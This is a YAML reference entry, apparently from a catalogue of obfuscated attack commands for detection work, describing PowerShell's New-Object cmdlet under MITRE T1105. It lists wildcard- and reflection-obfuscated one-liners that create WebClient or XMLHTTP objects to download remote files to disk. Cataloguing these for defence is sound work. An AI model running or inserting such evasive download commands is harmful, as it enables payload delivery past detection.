---
Name: New-Object
Description: "Creates .NET or COM objects. Used to instantiate WebClient for downloads, create COM shells, or access Windows APIs."
Platform: powershell
BinaryPath:
  - "PowerShell cmdlet"
Category: download
MitreID: T1105
Patterns:
  - Pattern: "& (gcm N*-Obj*) System.Net.WebClient"
    Wildcards: ["*"]
    Notes: "Wildcards on both verb and noun"
  - Pattern: "& (gcm New-Ob*) System.Net.WebClient"
    Wildcards: ["*"]
    Notes: "Star matches 'ject'"
  - Pattern: "& (gcm N?w-Object) System.Net.WebClient"
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'e'"
  - Pattern: "& (gcm N[d-f]w-Object) System.Net.WebClient"
    Wildcards: ["[d-f]"]
    Notes: "Character range matches 'e' in New"
  - Pattern: "(& (gcm N*-Obj*) Net.WebClient).DownloadFile('http://...','C:\\p.exe')"
    Wildcards: ["*"]
    Notes: "Full download one-liner with glob-resolved cmdlet"
  - Pattern: "& (gcm *Object) Net.WebClient"
    Wildcards: ["*"]
    Notes: "Prefix wildcard"
  - Pattern: "(& (gcm N*-Obj*) -ComObject MsXml2.ServerXmlHttp).Open('GET','http://...',$false)"
    Wildcards: ["*"]
    Notes: "gcm glob on New-Object; -ComObject instantiates MsXml2.ServerXmlHttp COM object"
  - Pattern: "(& (gcm N?w-Ob*) -ComObject MsXml2.ServerXmlHttp).Open('GET','http://...',$false)"
    Wildcards: ["?", "*"]
    Notes: "Mixed ? and * wildcards on New-Object with -ComObject"
  - Pattern: "$w=New-Object Net.WebClient;$w.(($w.PsObject.Methods|?{$_.Name-clike'D*g'}).Name).Invoke('http://...')"
    Wildcards: ["-clike"]
    Notes: "-clike 'D*g' resolves DownloadString method on Net.WebClient via PSObject.Methods"
    Method: DownloadString
  - Pattern: "$w=New-Object Net.WebClient;$w.(($w.PsObject.Methods|?{$_.Name-clike'D*F*'}).Name).Invoke('http://...','C:\\out.exe')"
    Wildcards: ["-clike"]
    Notes: "-clike 'D*F*' resolves DownloadFile method"
    Method: DownloadFile
Resources:
  - https://attack.mitre.org/techniques/T1105/
  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object
  - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38
---
